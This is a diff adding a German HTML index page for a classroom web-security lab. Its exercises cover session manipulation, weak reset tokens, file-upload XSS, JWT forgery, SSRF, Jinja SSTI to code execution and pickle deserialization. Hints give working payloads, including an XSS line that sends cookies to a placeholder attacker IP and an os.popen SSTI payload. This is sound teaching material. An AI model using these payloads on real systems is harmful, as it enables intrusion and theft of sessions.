+<h4>Erfolgskriterium</h4>
+<ul>
+<li>Nach deinem Request zeigt die Startseite <code>Rang: marshal</code>.
+</li>
+<li><code>/marshal</code> liefert <strong>HTTP 200</strong> und die geheime Fahndungsliste (nicht 403).
+</li>
+<li>Du hast weder den <code>SECRET_KEY</code> benutzt noch einen Marshal-Login gekannt.
+</li></ul>
+<h4>Zählt <strong>nicht</strong> als Lösung</h4>
+<ul>
+<li>Den <code>SECRET_KEY</code> erraten und den Cookie offline fälschen (das ist die <em>andere</em>
+ Challenge <code>challenge_session_forgery</code> / Ordner <code>13_session_forgery</code>).
+</li>
+<li>Den angezeigten Session-Text nur in den DevTools überschreiben (muss aus der
+ <strong>gespeicherten</strong> Session kommen, also über den Server-Roundtrip).
+</li></ul>
+<h4>Kür (Impact zeigen)</h4>
+<p>Mit demselben Trick lassen sich beliebige Session-Felder setzen — z. B. die Identität übernehmen:</p>
+<pre><code>user=marshal-buford&amp;rang=marshal</code></pre>
+<p>Zeigt die Startseite danach einen fremden Benutzer <strong>mit</strong> Marshal-Rang, ist klar: Wer die Session mitbestimmt, bestimmt Identität <strong>und</strong> Rechte.</p>
+    </div>
+    <p class="folder">Ordner: <a href="challenge_session_puppetry/"><code>challenge_session_puppetry/</code></a>
+       &middot; Start: <code>cd challenge_session_puppetry &amp;&amp; python app.py</code></p>
+    <p class="top"><a href="#top">&uarr; nach oben</a></p>
+  </article>
+  <article class="card" id="challenge_password_reset">
+    <div class="meta">
+      <span class="badge num">#07</span>
+      <span class="badge owasp">A07 Auth Failures</span>
+      <span class="badge port">Port :5010</span>
+      <span class="badge niv p3">mittel</span>
+    </div>
+    <h2>Schwaches Reset-Token</h2>
+    <div class="body">
+<p>Ziel dieser Übung: Zeigt, dass ein Reset-Token <strong>unvorhersagbar</strong> sein muss. Hier ist es der Sekunden-Zeitstempel — wer weiß, wann das Reset ausgelöst wurde, rät ihn in Sekunden und übernimmt das Konto <code>marshal</code>.</p>
+<p><strong>Aufbau:</strong> Jede:r startet die App auf dem <strong>eigenen</strong> Rechner; der/die <strong>Nachbar:in</strong> greift diese Instanz an.</p>
+<blockquote><pre><code class="lang-powershell">$env:HOST = &quot;0.0.0.0&quot;; python app.py        # http://&lt;deine-ip&gt;:5010</code></pre></blockquote>
+<hr class="rule">
+<h4>Spielregeln</h4>
+<ul>
+<li>Nur die eingeladene Instanz. Nur fiktive Konten. Kein DoS, keine Fremddaten.
+</li>
+<li>Nur während des Übungstermins. Lösungsweg kurz dokumentieren.
+</li></ul>
+<hr class="rule">
+<h4>Szenario</h4>
+<p>Es gibt das Konto <code>marshal</code> mit einem starken, unbekannten Passwort. Der „Passwort vergessen"-Flow schickt (im echten Betrieb) einen Link <code>/reset?token=…</code>. Das Token wird im Lab <strong>nicht</strong> angezeigt — du musst es raten.</p>
+<h4>Aufgabe</h4>
+<p>Setze das Passwort von <code>marshal</code> neu und logge dich damit ein.</p>
+<h4>Hinweise</h4>
+<ul>
+<li>Fordere selbst ein Reset für <code>marshal</code> an — und <strong>merke dir die Uhrzeit</strong>.
+</li>
+<li>Wie könnte ein Token aussehen, das genau in dieser Sekunde erzeugt wurde?
+ Ein <code>int(time.time())</code> ist eine 10-stellige Zahl.
+</li>
+<li>Du kennst die Sekunde nicht exakt → probiere ein kleines Fenster
+ (z. B. ±5 Sekunden) auf <code>/reset?token=…</code> durch.
+</li></ul>
+<h4>Erfolgskriterium</h4>
+<ul>
+<li><code>/reset</code> zeigt „Angriff geglückt", und du loggst dich als <code>marshal</code> mit
+ deinem <strong>neuen</strong> Passwort ein.
+</li></ul>
+<h4>Zählt <strong>nicht</strong> als Lösung</h4>
+<ul>
+<li>Das Token aus der Server-Konsole ablesen; den Quelltext als Orakel nutzen.
+</li></ul>
+    </div>
+    <p class="folder">Ordner: <a href="challenge_password_reset/"><code>challenge_password_reset/</code></a>
+       &middot; Start: <code>cd challenge_password_reset &amp;&amp; python app.py</code></p>
+    <p class="top"><a href="#top">&uarr; nach oben</a></p>
+  </article>
+  <article class="card" id="challenge_file_upload">
+    <div class="meta">
+      <span class="badge num">#08</span>
+      <span class="badge owasp">A04/A05</span>
+      <span class="badge port">Port :5006</span>
+      <span class="badge niv p3">mittel</span>
+    </div>
+    <h2>Unrestricted File Upload</h2>
+    <div class="body">
+<p>Ziel dieser Übung: Zeigt, dass ein Upload ohne Typprüfung gefährlich ist, wenn die Datei danach <strong>im Ursprung der App</strong> ausgeliefert wird. Ihr ladet eine „Datei" hoch, die beim Öffnen JavaScript <strong>im App-Kontext</strong> ausführt.</p>
+<p><strong>Aufbau:</strong> Jede:r startet die App auf dem <strong>eigenen</strong> Rechner; der/die <strong>Nachbar:in</strong> greift diese Instanz an.</p>
+<blockquote><pre><code class="lang-powershell">$env:HOST = &quot;0.0.0.0&quot;; python app.py        # http://&lt;deine-ip&gt;:5006</code></pre></blockquote>
+<hr class="rule">
+<h4>Spielregeln</h4>
+<ul>
+<li>Nur die eingeladene Instanz. Nur fiktive, harmlose Dateien (<code>alert</code>).
+</li>
+<li>Kein DoS, keine echten Schad-Dateien, keine Massen-Uploads.
+</li>
+<li>Nur während des Übungstermins. Lösungsweg kurz dokumentieren.
+</li></ul>
+<hr class="rule">
+<h4>Szenario</h4>
+<p>Das Upload-Feld nimmt <strong>jede</strong> Datei an und liefert sie danach unter <code>/uploads/&lt;name&gt;</code> wieder aus — mit dem <strong>Content-Type passend zur Endung</strong>. Eine <code>.html</code> wird also als Webseite im <strong>selben Ursprung</strong> wie die App angezeigt.</p>
+<h4>Aufgabe</h4>
+<p>Lade eine Datei hoch, die beim <strong>Öffnen</strong> JavaScript ausführt (sichtbar durch <code>alert('XSS')</code>) — und zwar auf <code>http://ZIEL:5006/uploads/...</code>, also im Origin der Anwendung.</p>
+<h4>Hinweis</h4>
+<ul>
+<li>Keine Bild-/Typprüfung → die Endung bestimmt, wie der Browser die Datei
+ behandelt. Was passiert bei <strong><code>.html</code></strong> oder <strong><code>.svg</code></strong>?
+</li>
+<li>Lege eine Datei <code>pwn.html</code> an mit:
+<pre><code class="lang-html">  &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code></pre>
+ hochladen, dann den Link <code>/uploads/pwn.html</code> öffnen.
+</li>
+<li>SVG geht auch:
+<pre><code class="lang-xml">  &lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;&lt;/svg&gt;</code></pre>
+</li></ul>
+<h4>Erfolgskriterium</h4>
+<ul>
+<li>Beim Öffnen deiner hochgeladenen Datei feuert <code>alert('XSS')</code>.
+</li>
+<li>Die Seite läuft unter <code>/uploads/...</code>, also im <strong>Origin der App</strong> (dadurch wären
+ App-Cookies/Session angreifbar).
+</li></ul>
+<h4>Zählt <strong>nicht</strong> als Lösung</h4>
+<ul>
+<li>Eine <code>.html</code> lokal im Browser öffnen (nicht über <code>/uploads/</code> vom Server).
+</li>
+<li>Nur ein Bild hochladen, das nichts ausführt.
+</li></ul>
+<h4>Kür (Impact)</h4>
+<p>Weil die Datei im App-Origin läuft, kann sie App-Cookies lesen/abschicken (sofern nicht <code>HttpOnly</code>). In <code>pwn.html</code>:</p>
+<pre><code class="lang-html">&lt;script&gt;new Image().src=&#x27;http://DEINE-IP:8000/klau?c=&#x27;+encodeURIComponent(document.cookie)&lt;/script&gt;</code></pre>
+    </div>
+    <p class="folder">Ordner: <a href="challenge_file_upload/"><code>challenge_file_upload/</code></a>
+       &middot; Start: <code>cd challenge_file_upload &amp;&amp; python app.py</code></p>
+    <p class="top"><a href="#top">&uarr; nach oben</a></p>
+  </article>
+  <article class="card" id="challenge_jwt">
+    <div class="meta">
+      <span class="badge num">#09</span>
+      <span class="badge owasp">A02/A07</span>
+      <span class="badge port">Port :5004</span>
+      <span class="badge niv p3">mittel</span>
+    </div>
+    <h2>JWT-Fälschung</h2>
+    <div class="body">
+<p>Ziel dieser Übung: Zeigt, dass ein „sicher aussehendes" Token (JWT) wertlos ist, wenn die Prüfung schwach ist. Ihr stellt euch selbst ein Token mit <strong>role=admin</strong> aus und betretet den Admin-Bereich.</p>
+<p><strong>Aufbau:</strong> Jede:r startet die App auf dem <strong>eigenen</strong> Rechner; der/die <strong>Nachbar:in</strong> greift diese Instanz an.</p>
+<blockquote><pre><code class="lang-powershell">$env:HOST = &quot;0.0.0.0&quot;; python app.py        # http://&lt;deine-ip&gt;:5004</code></pre></blockquote>
+<hr class="rule">
+<h4>Spielregeln</h4>
+<ul>
+<li>Nur die eingeladene Instanz. Nur fiktive Konten. Kein DoS, keine Fremddaten.
+</li>
+<li>Nur während des Übungstermins. Lösungsweg kurz dokumentieren.
+</li></ul>
+<hr class="rule">
+<h4>Szenario</h4>
+<p>Nach dem Login (<code>team-test</code> / <code>test123</code>) bekommst du ein Token im Cookie <code>token</code> mit <code>role=user</code>. Der <strong>Admin-Bereich</strong> (<code>/admin</code>) verlangt <code>role=admin</code>. Ein Admin-Passwort kennst du nicht.</p>
+<p>Ein JWT besteht aus drei Base64-Teilen: <code>header.payload.signature</code>. <strong>Header</strong> und <strong>Payload</strong> sind nur base64-codiert (lesbar/änderbar), die <strong>Signatur</strong> soll Manipulation verhindern.</p>
+<h4>Aufgabe</h4>
+<p>Verschaffe dir Zugang zu <code>/admin</code>, indem du ein <strong>eigenes Token mit <code>role=admin</code></strong> vorlegst — ohne Admin-Zugangsdaten.</p>
+<h4>Hinweis</h4>
+<p>Es gibt <strong>zwei</strong> Wege (einer reicht):</p>
+<p>1. <strong><code>alg: none</code></strong> — Setze im Header <code>"alg":"none"</code> und lass die Signatur weg (dritter Teil leer). Akzeptiert der Server das, braucht es gar keine Signatur. 2. <strong>Schwaches Secret</strong> — Das HMAC-Secret ist ein naheliegendes Standardwort. Errätst du es, kannst du ein gültig signiertes Token mit <code>role=admin</code> bauen (z. B. mit <code>jwt.io</code> oder der Bibliothek <code>PyJWT</code>).</p>
+<p>Dekodiere zuerst dein aktuelles Token (Payload base64-decoden), ändere <code>role</code> auf <code>admin</code>, und baue es nach einem der beiden Wege neu zusammen. Dann Cookie <code>token</code> auf den neuen Wert setzen und <code>/admin</code> öffnen.</p>
+<h4>Erfolgskriterium</h4>
+<ul>
+<li><code>/admin</code> zeigt den Admin-Bereich („Angriff geglückt … role=admin").
+</li>
+<li>Du hast kein Admin-Passwort verwendet, sondern das Token selbst erzeugt.
+</li></ul>
+<h4>Zählt <strong>nicht</strong> als Lösung</h4>
+<ul>
+<li>Den vorhandenen <code>role=user</code>-Token unverändert benutzen.
+</li>
+<li>Nur den Payload ändern, aber die Signatur so lassen (wird bei korrektem Server
+ abgelehnt — hier klappt es nur über <code>alg:none</code> <strong>oder</strong> das richtige Secret).
+</li></ul>
+    </div>
+    <p class="folder">Ordner: <a href="challenge_jwt/"><code>challenge_jwt/</code></a>
+       &middot; Start: <code>cd challenge_jwt &amp;&amp; python app.py</code></p>
+    <p class="top"><a href="#top">&uarr; nach oben</a></p>
+  </article>
+  <article class="card" id="challenge_ssrf">
+    <div class="meta">
+      <span class="badge num">#10</span>
+      <span class="badge owasp">A10 SSRF</span>
+      <span class="badge port">Port :5011</span>
+      <span class="badge niv p3">mittel</span>
+    </div>
+    <h2>Server-Side Request Forgery</h2>
+    <div class="body">
+<p>Ziel dieser Übung: Zeigt, wie man den <strong>Server</strong> dazu bringt, URLs abzurufen, die nur <strong>er</strong> erreicht. Ein „Steckbrief-Importer" lädt Bilder per URL — und lädt genauso bereitwillig die interne Marshal-Seite.</p>
+<p><strong>Aufbau:</strong> Jede:r startet die App auf dem <strong>eigenen</strong> Rechner; der/die <strong>Nachbar:in</strong> greift diese Instanz an.</p>
+<blockquote><pre><code class="lang-powershell">$env:HOST = &quot;0.0.0.0&quot;; python app.py        # http://&lt;deine-ip&gt;:5011</code></pre></blockquote>
+<hr class="rule">
+<h4>Spielregeln</h4>
+<ul>
+<li>Nur die eingeladene Instanz. <strong>Keine echten/fremden URLs</strong> abrufen lassen.
+</li>
+<li>Nur während des Übungstermins. Lösungsweg kurz dokumentieren.
+</li></ul>
+<hr class="rule">
+<h4>Szenario</h4>
+<p>Der Importer holt ein Foto von einer angegebenen <code>url</code>. Das <strong>interne</strong> Marshal-Board <code>/intern</code> beantwortet Anfragen nur, wenn sie von <code>localhost</code> kommen — von außen gibt es <code>403</code>. Auf dem Server läuft alles unter <code>127.0.0.1</code>.</p>
+<h4>Aufgabe</h4>
+<p>Lies den Inhalt von <code>/intern</code>, obwohl er dir direkt <code>403</code> liefert.</p>
+<h4>Hinweise</h4>
+<ul>
+<li>Ruf <code>/intern</code> erst direkt auf — du bekommst <code>403</code>.
+</li>
+<li>Der Importer macht die Anfrage <strong>für dich</strong>, vom Server aus. Welche Absender-
+ Adresse sieht <code>/intern</code> dann?
+</li>
+<li>Welche <code>url</code> müsstest du dem Importer geben, damit er sich quasi selbst
+ aufruft? Der Server lauscht lokal auf seinem eigenen Port.
+</li></ul>
+<h4>Erfolgskriterium</h4>
+<ul>
+<li>Die Importer-Antwort zeigt den geheimen Board-Text und „Angriff geglückt".
+</li></ul>
+<h4>Zählt <strong>nicht</strong> als Lösung</h4>
+<ul>
+<li><code>/intern</code> direkt von localhost aufrufen (wenn du selbst auf dem Server sitzt).
+ Der Angriff muss über den Importer laufen.
+</li></ul>
+    </div>
+    <p class="folder">Ordner: <a href="challenge_ssrf/"><code>challenge_ssrf/</code></a>
+       &middot; Start: <code>cd challenge_ssrf &amp;&amp; python app.py</code></p>
+    <p class="top"><a href="#top">&uarr; nach oben</a></p>
+  </article>
+  <article class="card" id="challenge_ssti">
+    <div class="meta">
+      <span class="badge num">#11</span>
+      <span class="badge owasp">A03 Injection</span>
+      <span class="badge port">Port :5003</span>
+      <span class="badge niv p4">mittel–schwer</span>
+    </div>
+    <h2>SSTI → RCE</h2>
+    <div class="body">
+<p>Ziel dieser Übung: Zeigt, dass eine Seite den Server übernehmen lässt, wenn sie eure Eingabe nicht als <strong>Daten</strong>, sondern als <strong>Template-Code</strong> behandelt. Aus einem harmlosen „Visitenkarten-Generator" wird so Code-Ausführung.</p>
+<p><strong>Aufbau:</strong> Jede:r startet die App auf dem <strong>eigenen</strong> Rechner. Der/die <strong>Nachbar:in</strong> greift genau diese Instanz an.</p>
+<blockquote><pre><code class="lang-powershell">$env:HOST = &quot;0.0.0.0&quot;; python app.py        # http://&lt;deine-ip&gt;:5003</code></pre>
+<p>(Standard <code>127.0.0.1</code> = nur lokal. <code>0.0.0.0</code> nur im Kurs-Netz während des Termins.)</p></blockquote>
+<hr class="rule">
+<h4>Spielregeln</h4>
+<ul>
+<li>Nur die Instanz angreifen, zu der ihr eingeladen wurdet. Keine anderen Dienste.
+</li>
+<li>Nur fiktive Eingaben. Kein DoS, kein Löschen/Verändern von Systemdateien.
+</li>
+<li>Befehle harmlos halten (<code>whoami</code>, <code>id</code>, <code>hostname</code>) — <strong>nichts</strong> Zerstörerisches,
+ keine Daten abfließen lassen.
+</li>
+<li>Nur während des Übungstermins. Lösungsweg kurz dokumentieren.
+</li></ul>
+<hr class="rule">
+<h4>Szenario</h4>
+<p>Der „Visitenkarten-Generator" nimmt deinen <strong>Namen</strong> und baut daraus eine Begrüßung. Probiere aus, was mit dem Namen passiert — wird er nur eingesetzt oder auch <strong>ausgewertet</strong>?</p>
+<h4>Aufgabe</h4>
+<p>Bringt die Seite dazu, auf dem Server <strong>beliebigen Python-Code</strong> auszuführen (z. B. den Benutzernamen des Server-Prozesses über <code>whoami</code> anzeigen) — nur über das Namensfeld.</p>
+<h4>Hinweis</h4>
+<ul>
+<li>Teste zuerst, ob <strong>gerechnet</strong> wird: Name = <code>{{7*7}}</code>. Erscheint <strong>49</strong>, wird
+ deine Eingabe als <strong>Template</strong> ausgewertet → SSTI.
+</li>
+<li>Die Template-Engine ist <strong>Jinja2</strong> (Flask). Über eingebaute Objekte kommst du
+ an Python-Module heran.
+</li>
+<li>Eskalation: <code>{{ config }}</code> zeigt die Flask-Konfiguration (inkl. Geheimnisse).
+</li>
+<li>Für Befehle führt ein Weg über ein Jinja-Global zu <code>os</code>:
+<pre><code class="lang-jinja">  {{ lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read() }}</code></pre>
+</li></ul>
+<h4>Erfolgskriterium</h4>
+<ul>
+<li><code>{{7*7}}</code> liefert <code>49</code> (SSTI bewiesen).
+</li>
+<li>Ein Payload zeigt die Ausgabe eines <strong>Betriebssystem-Befehls</strong> (z. B. <code>whoami</code>)
+ auf der Seite.
+</li></ul>
+<h4>Zählt <strong>nicht</strong> als Lösung</h4>
+<ul>
+<li>Nur <code>{{7*7}}</code> → 49 (das ist der Nachweis, noch nicht die „Übernahme").
+</li>
+<li>Code über die Konsole/lokal ausführen statt über das Namensfeld.
+</li></ul>
+    </div>
+    <p class="folder">Ordner: <a href="challenge_ssti/"><code>challenge_ssti/</code></a>
+       &middot; Start: <code>cd challenge_ssti &amp;&amp; python app.py</code></p>
+    <p class="top"><a href="#top">&uarr; nach oben</a></p>
+  </article>
+  <article class="card" id="challenge_pickle">
+    <div class="meta">
+      <span class="badge num">#12</span>
+      <span class="badge owasp">A08 Integrity Failures</span>
+      <span class="badge port">Port :5012</span>
+      <span class="badge niv p4">mittel–schwer</span>
+    </div>
+    <h2>Insecure Deserialization</h2>
+    <div class="body">
+<p>Ziel dieser Übung: Zeigt, warum man <code>pickle</code> <strong>niemals</strong> auf Daten anwendet, die vom Client kommen. Die Merkliste steckt als pickle-Objekt im Cookie — ein präpariertes Cookie führt beim Entpacken Server-Code aus.</p>
+<p><strong>Aufbau:</strong> Jede:r startet die App auf dem <strong>eigenen</strong> Rechner; der/die <strong>Nachbar:in</strong> greift diese Instanz an.</p>
+<blockquote><pre><code class="lang-powershell">$env:HOST = &quot;0.0.0.0&quot;; python app.py        # http://&lt;deine-ip&gt;:5012</code></pre></blockquote>
+<hr class="rule">
+<h4>Spielregeln</h4>
+<ul>
+<li>Nur die eingeladene Instanz. <strong>Payload harmlos halten</strong> (Markierungsdatei
+ anlegen, <code>whoami</code>) — kein echter Schaden, kein DoS.
+</li>
+<li>Nur während des Übungstermins. Lösungsweg kurz dokumentieren.
+</li></ul>
+<hr class="rule">
+<h4>Szenario</h4>
+<p>Die App speichert deine Merkliste im Cookie <code>merkliste</code> — als base64-kodiertes <code>pickle</code>-Objekt. Bei jedem Aufruf ruft der Server <code>pickle.loads()</code> darauf auf, um die Liste wiederherzustellen.</p>
+<h4>Aufgabe</h4>
+<p>Bring den Server dazu, beim Laden deines Cookies <strong>Code auszuführen</strong>. Als Beweis soll die Datei <code>pwned.txt</code> im App-Ordner entstehen — die Startseite zeigt dann „Angriff geglückt".</p>
+<h4>Hinweise</h4>
+<ul>
+<li><code>pickle.loads</code> ist kein reines „Daten lesen" — beim Entpacken kann ein Objekt
+ über <code>__reduce__</code> festlegen, <em>wie</em> es wiederhergestellt wird.
+</li>
+<li>Ein <code>__reduce__</code>, das <code>(os.system, ("...",))</code> zurückgibt, läuft beim Entpacken.
+</li>
+<li>Baue das Cookie lokal mit demselben <code>pickle</code> + <code>base64</code> und setze es im
+ Request.
+</li></ul>
+<h4>Erfolgskriterium</h4>
+<ul>
+<li><code>pwned.txt</code> existiert, Startseite meldet „Angriff geglückt".
+</li></ul>
+<h4>Zählt <strong>nicht</strong> als Lösung</h4>
+<ul>
+<li><code>pwned.txt</code> von Hand anlegen; destruktive oder systemverändernde Payloads.
+</li></ul>
+    </div>
+    <p class="folder">Ordner: <a href="challenge_pickle/"><code>challenge_pickle/</code></a>
+       &middot; Start: <code>cd challenge_pickle &amp;&amp; python app.py</code></p>
+    <p class="top"><a href="#top">&uarr; nach oben</a></p>
+  </article>
+
+  <footer>
+    Diese Seite wird aus den <code>challenge.md</code>-Dateien erzeugt
+    (<code>python build_index.py</code>) und zeigt bewusst <b>nur die Aufgaben</b> &ndash;
+    der Abschnitt &bdquo;Verteidigung / Fix&ldquo; samt L&ouml;sungsweg bleibt in den
+    Ordnern. &middot; Hacking mit Python &middot; Cowboy-Forum-Lab
+  </footer>
+</div>
+</body>
+</html>
